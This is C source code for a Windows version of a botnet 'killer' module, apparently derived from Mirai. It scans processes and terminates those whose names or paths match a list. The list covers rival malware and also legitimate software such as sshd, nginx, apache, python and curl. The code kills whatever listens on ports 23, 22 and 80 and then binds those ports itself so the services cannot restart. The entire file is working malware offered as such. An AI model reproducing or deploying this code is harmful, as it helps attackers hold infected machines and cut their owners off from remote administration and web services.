// Complete Windows implementation of killer.c
// Process killer to eliminate competing malware

#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif

#include <stdlib.h>
#include <time.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <tlhelp32.h>
#include <psapi.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "psapi.lib")

#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"

// Process scanning state
static int scan_counter = 0;
static int killer_highest_pid = KILLER_MIN_PID;
static time_t last_pid_scan = 0;

// Memory to search for malware signatures
static char *killer_realpath = NULL;
static int killer_realpath_len = 0;
static int killer_pid = 0;

// Known malware process names to kill
static const char *malware_names[] = {
    "anime", "jackbot", "qbot", "lightaidra", "sqlmap", "nmap",
    "perl", "python", "masscan", "zmap", "nc.traditional",
    "nc", "netcat", "tftp", "aria2c", "wget", "curl", "openssl",
    "pty", "sh", "bash", "busybox", "dropbear", "sshd", "telnetd",
    "apache", "nginx", "lighttpd", "httpd", "sshd", "dropbear",
    NULL};

// Known malware strings in memory/command line
static const char *malware_signatures[] = {
    "anime", "jackbot", "qbot", "lightaidra", "bashlite",
    "pty", "/dev/watchdog", "/dev/misc", ".anime", "ECCHI",
    "DDoS", "flood", "attack", ".t", "/bin/sh", "/bin/bash",
    NULL};

// Port-based killing - bind to prevent restart
static int bind_sockets[3] = {-1, -1, -1};

void killer_init(void)
{
  struct sockaddr_in bind_addr;
  int i;

#ifdef DEBUG
  printf("[killer] Initializing Windows process killer\n");
#endif

  killer_pid = GetCurrentProcessId();

  // Get our own executable path for comparison
  killer_realpath = calloc(MAX_PATH, sizeof(char));
  killer_realpath_len = GetModuleFileNameA(NULL, killer_realpath, MAX_PATH);

#ifdef KILLER_REBIND_TELNET
  // Kill telnet and bind port 23
  if (killer_kill_by_port(htons(23)))
  {
#ifdef DEBUG
    printf("[killer] Killed tcp/23 (telnet)\n");
#endif
  }

  bind_addr.sin_family = AF_INET;
  bind_addr.sin_addr.s_addr = INADDR_ANY;
  bind_addr.sin_port = htons(23);

  if ((bind_sockets[0] = socket(AF_INET, SOCK_STREAM, 0)) != -1)
  {
    int opt = 1;
    setsockopt(bind_sockets[0], SOL_SOCKET, SO_REUSEADDR, (char *)&opt, sizeof(opt));
    bind(bind_sockets[0], (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in));
    listen(bind_sockets[0], 1);
#ifdef DEBUG
    printf("[killer] Bound to tcp/23 (telnet)\n");
#endif
  }
#endif

#ifdef KILLER_REBIND_SSH
  // Kill SSH and bind port 22
  if (killer_kill_by_port(htons(22)))
  {
#ifdef DEBUG
    printf("[killer] Killed tcp/22 (SSH)\n");
#endif
  }

  bind_addr.sin_port = htons(22);
  if ((bind_sockets[1] = socket(AF_INET, SOCK_STREAM, 0)) != -1)
  {
    int opt = 1;
    setsockopt(bind_sockets[1], SOL_SOCKET, SO_REUSEADDR, (char *)&opt, sizeof(opt));
    bind(bind_sockets[1], (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in));
    listen(bind_sockets[1], 1);
#ifdef DEBUG
    printf("[killer] Bound to tcp/22 (SSH)\n");
#endif
  }
#endif

#ifdef KILLER_REBIND_HTTP
  // Kill HTTP and bind port 80
  if (killer_kill_by_port(htons(80)))
  {
#ifdef DEBUG
    printf("[killer] Killed tcp/80 (HTTP)\n");
#endif
  }

  bind_addr.sin_port = htons(80);
  if ((bind_sockets[2] = socket(AF_INET, SOCK_STREAM, 0)) != -1)
  {
    int opt = 1;
    setsockopt(bind_sockets[2], SOL_SOCKET, SO_REUSEADDR, (char *)&opt, sizeof(opt));
    bind(bind_sockets[2], (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in));
    listen(bind_sockets[2], 1);
#ifdef DEBUG
    printf("[killer] Bound to tcp/80 (HTTP)\n");
#endif
  }
#endif

#ifdef DEBUG
  printf("[killer] Starting process scanning\n");
#endif

  // Perform initial kill scan
  killer_kill();
}

void killer_kill(void)
{
  HANDLE snapshot;
  PROCESSENTRY32 pe32;
  time_t current_time = time(NULL);

  // Rate limit scanning
  if (current_time - last_pid_scan < KILLER_SCAN_INTERVAL)
    return;

  last_pid_scan = current_time;
  scan_counter = 0;

#ifdef DEBUG
  printf("[killer] Scanning processes\n");
#endif

  snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (snapshot == INVALID_HANDLE_VALUE)
  {
#ifdef DEBUG
    printf("[killer] Failed to create process snapshot\n");
#endif
    return;
  }

  pe32.dwSize = sizeof(PROCESSENTRY32);

  if (!Process32First(snapshot, &pe32))
  {
    CloseHandle(snapshot);
    return;
  }

  do
  {
    DWORD pid = pe32.th32ProcessID;
    char exe_name[MAX_PATH];
    char *cmd_line = NULL;
    HANDLE process;
    int i, should_kill = 0;

    scan_counter++;

    // Skip our own process
    if (pid == killer_pid)
      continue;

    // Skip system processes
    if (pid < KILLER_MIN_PID)
      continue;

    // Get executable name (convert from WCHAR if needed)
    WideCharToMultiByte(CP_ACP, 0, pe32.szExeFile, -1, exe_name, MAX_PATH, NULL, NULL);

#ifdef DEBUG
    if (scan_counter % 100 == 0)
      printf("[killer] Scanned %d processes...\n", scan_counter);
#endif

    // Check against known malware process names
    for (i = 0; malware_names[i] != NULL; i++)
    {
      if (strstr(exe_name, malware_names[i]) != NULL)
      {
        should_kill = 1;
#ifdef DEBUG
        printf("[killer] Found malware process by name: %s (PID %d)\n", exe_name, pid);
#endif
        break;
      }
    }

    // Open process for inspection
    if (!should_kill)
    {
      process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE, FALSE, pid);
      if (process != NULL)
      {
        char path[MAX_PATH];
        DWORD path_len = MAX_PATH;

        // Get full executable path
        if (QueryFullProcessImageNameA(process, 0, path, &path_len))
        {
          // Check if it's the same as us
          if (killer_realpath_len > 0 &&
              _stricmp(path, killer_realpath) == 0)
          {
            CloseHandle(process);
            continue; // Don't kill ourselves
          }

          // Check path for malware signatures
          for (i = 0; malware_signatures[i] != NULL; i++)
          {
            if (strstr(path, malware_signatures[i]) != NULL)
            {
              should_kill = 1;
#ifdef DEBUG
              printf("[killer] Found malware by path signature: %s (PID %d)\n", path, pid);
#endif
              break;
            }
          }
        }

        // Try to read command line arguments (basic check)
        if (!should_kill)
        {
          // On Windows, getting command line of another process is complex
          // For now, we'll skip this and rely on name/path checks
        }

        if (should_kill)
        {
#ifdef DEBUG
          printf("[killer] Terminating process %d (%s)\n", pid, exe_name);
#endif
          TerminateProcess(process, 1);
        }

        CloseHandle(process);
      }
    }
    else
    {
      // Kill by name match
      process = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
      if (process != NULL)
      {
#ifdef DEBUG
        printf("[killer] Terminating process %d (%s)\n", pid, exe_name);
#endif
        TerminateProcess(process, 1);
        CloseHandle(process);
      }
    }

  } while (Process32Next(snapshot, &pe32));

  CloseHandle(snapshot);

#ifdef DEBUG
  printf("[killer] Process scan complete, scanned %d processes\n", scan_counter);
#endif
}

BOOL killer_kill_by_port(port_t port)
{
  PMIB_TCPTABLE tcp_table;
  DWORD table_size = 0;
  DWORD result;
  int i;
  BOOL killed = FALSE;

  // Get size needed for TCP table
  result = GetTcpTable(NULL, &table_size, FALSE);
  if (result != ERROR_INSUFFICIENT_BUFFER)
    return FALSE;

  tcp_table = (PMIB_TCPTABLE)calloc(1, table_size);
  if (tcp_table == NULL)
    return FALSE;

  // Get actual TCP table
  result = GetTcpTable(tcp_table, &table_size, FALSE);
  if (result != NO_ERROR)
  {
    free(tcp_table);
    return FALSE;
  }

#ifdef DEBUG
  printf("[killer] Checking %d TCP connections for port %d\n",
         tcp_table->dwNumEntries, ntohs(port));
#endif

  // Check each entry
  for (i = 0; i < tcp_table->dwNumEntries; i++)
  {
    MIB_TCPROW *row = &tcp_table->table[i];

    // Check if this entry is listening on our target port
    if (row->dwLocalPort == port &&
        row->dwState == MIB_TCP_STATE_LISTEN)
    {
      DWORD pid = row->dwOwningPid;

      // Don't kill ourselves
      if (pid == killer_pid)
        continue;

#ifdef DEBUG
      printf("[killer] Found process %d listening on port %d\n", pid, ntohs(port));
#endif

      // Try to terminate the process
      HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
      if (process != NULL)
      {
        if (TerminateProcess(process, 1))
        {
          killed = TRUE;
#ifdef DEBUG
          printf("[killer] Terminated process %d\n", pid);
#endif
        }
        CloseHandle(process);
      }
    }
  }

  free(tcp_table);
  return killed;
}
